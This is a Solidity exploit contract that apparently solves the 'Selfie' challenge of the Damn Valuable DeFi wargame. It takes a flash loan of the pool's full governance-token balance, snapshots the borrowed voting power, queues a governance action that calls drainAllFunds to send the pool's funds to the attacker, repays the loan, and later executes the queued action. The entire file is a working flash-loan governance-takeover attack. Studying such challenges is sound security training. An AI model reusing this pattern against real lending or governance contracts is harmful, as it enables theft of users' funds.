// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract AttackSelfiePool {
    using Address for address;

    SelfiePool private pool;
    SimpleGovernance private simpleGovernance;

    address owner;
    DamnValuableTokenSnapshot token;
    uint256 actionId;

    constructor(
        address selfiePoolAddress,
        address simpleGovernanceAddress,
        address tokenAddress
    ) {
        pool = SelfiePool(selfiePoolAddress);
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);

        owner = msg.sender;
    }

    function executeFlashLoan() external {
        // Flashloan entire DVT balance
        uint256 tokenBalance = token.balanceOf(address(pool));
        // Triggers receiveTokens() callback
        pool.flashLoan(tokenBalance);
    }

    function receiveTokens(address, uint256 amount) external {
        // Having a majority of governance tokens at this moment, create a snapshot.
        DamnValuableTokenSnapshot(token).snapshot();
        // build the calldata for queueAction
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            payable(owner)
        );
        // Queue a proposal to drain funds.
        actionId = simpleGovernance.queueAction(
            payable(address(pool)),
            data,
            0 wei
        );
        // Pay back flash loan.
        token.transfer(address(pool), amount);
    }

    function executeAction() external {
        // After waiting for the action delay to have passed, execute it.
        simpleGovernance.executeAction{value: 0 ether}(actionId);
    }

    receive() external payable {}
}
